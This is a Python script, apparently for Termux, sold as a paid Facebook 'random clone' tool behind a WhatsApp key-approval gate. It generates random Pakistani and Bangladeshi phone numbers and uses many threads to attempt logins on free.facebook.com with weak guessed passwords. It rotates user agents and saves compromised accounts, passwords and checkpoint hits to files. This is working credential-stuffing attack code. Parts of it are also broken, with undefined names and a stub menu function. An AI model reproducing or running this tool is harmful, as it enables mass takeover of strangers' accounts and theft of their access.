import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;96m' # 

H = '\033[1;94m' # 

K = '\x1b[1;93m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

        

def main_apv():

    imt="110Y=="

    ak="RAKIB_100RS"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()

    except IOError:

        os.system("clear")

        print(logo)

        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        print ("")

        myid=uuid.uuid4().hex[:10].upper()

        print ("          YOUR KEY : "+ak+myid+imt)

        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')

        kok.write(myid+imt)

        kok.close()

        print ("")

        print ("")

        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")

        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/+9660531382117?text=' + tks)

        

    r1=requests.get("https://github.com/MarkZuke-404/maximum.number-/blob/main/Server%20text").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL Rakib")     
           
        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/+9660531382117?text=' + tks)

logo="""
 ########     ###    ##    ## #### ########  
##     ##   ## ##   ##   ##   ##  ##     ## 
##     ##  ##   ##  ##  ##    ##  ##     ## 
########  ##     ## #####     ##  ########  
##   ##   ######### ##  ##    ##  ##     ## 
##    ##  ##     ## ##   ##   ##  ##     ## 
##     ## ##     ## ##    ## #### ########  

        \033[1;92m༄MR᭄•───────────────────────────────────────•༄RAKIB᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : MRRAKIB.              \033[1;93m                             
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : MRRAKIB                 \033[1;93m                            
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MRRAKIB.            \033[1;93m                           
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +9660531382117 \033[1;93m                           
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID                  \033[1;93m                           
             \033[1;93m▇▇➣   \033[1;94mGIVE ME 100RS FOR APRVAL  \033[1;93m                           
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄MR᭄•───────────────────────────────────────•༄RAKIB᭄
""" 
def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/RAKIB-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/RAKIB-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back Ahmad Menu ")

	    R()

		

def R():

			os.system("clear")

			print(logo)
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_𝙰𝙺𝙰𝚂𝙷_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print(f"{BLUE}══════════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}RANDOM CLONE PAK  M1")
    print(f"{RED}[02] {WHITE}RANDOM CLONE BD  M1")
    print(f"{RED}[03] {WHITE}OWNER FB ID")
    print(f"{RED}[04] {WHITE}OWNER WHATSAPP")
    print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    𝙰𝙺𝙰𝚂𝙷 = input("[√] CHOOSE : ")
    if 𝙰𝙺𝙰𝚂𝙷 in ["1","01"]:
        
        password()
    elif 𝙰𝙺𝙰𝚂𝙷 in ["2","02"]:
        Tabii2()
        
    elif 𝙰𝙺𝙰𝚂𝙷 in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/owner.termux");xyz()
    elif 𝙰𝙺𝙰𝚂𝙷 in ["4","04"]:
        os.system("xdg-open https://wa.me/+8801721474011");xyz()
    elif 𝙰𝙺𝙰𝚂𝙷 in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()
#---------------------[PASS DEF]---------------------#
def password():
    
    os.system("clear")
    print(logo)
    print('       \x1b[97m[\033[37;41m  P A S S W O R D   M E N U   \033[0;m] ')
    print(f"")
    print(f"{RED}[01] {WHITE} 1 PASSWORD   {GREEN} [ FASTEST⚡]")
    print(f"{RED}[02] {WHITE} 2 PASSWORDS  {GREEN} [ FAST     ]")
    print(f"{RED}[03] {WHITE} 5 PASSWORDS  {GREEN} [ SLOW   🐌]")
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{𝙰𝙺𝙰𝚂𝙷2} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://www.facebook.com/owner.termux")
        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.facebook.com/owner.termux")
        password2()
    elif passX in ['3','03']:
        os.system("xdg-open https://www.facebook.com/owner.termux")
        password5()
    else:
        xyz()
#---------------------[CLONING MAIN DEF]---------------------#
#---------------------[PASS 1 CLONING MENU]---------------------#
def password1():
    
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ FASTEST⚡]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
            manshera.submit(free1,uid,pwx,tl)
def free1(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass






#---------------------[PASS 2 CLONING MENU]---------------------#
def password2():
    user=[]
    
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ FAST ]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,code+love]
            manshera.submit(free2,uid,pwx,tl)
def free2(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
#---------------------[PASS 5 CLONING MENU]---------------------#
def password5():
    user=[]
    
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ SLOW 🐌]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,code+love,'786786','123456','pakistan']
            manshera.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
#---------------------[MAIN CLONING DEF 2]---------------------#


def Tabii2():
    user=[]
    
    os.getuid
    os.geteuid
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(' 880171 , 880172 , 880173 \n 880174 , 880191 , 880192\n 880193 , 880194 , 880181\n 880182 , 880183 , 880184\n 880161 , 880162 , 880163 ')
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\n {WHITE}TOTAL IDZ             : {RED}"+tl)
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {RED}BANGLADESH 🇧🇩")
        print(f" {WHITE}NUMBER YOU PUT        : {RED}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
        print(f" {WHITE}BE PATIENT.......")
        print(f" {WHITE}TO STOP PROCESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,'786786','123456']
            manshera.submit(m,uid,pwx,tl)
def m(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass



#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    xyz()
    
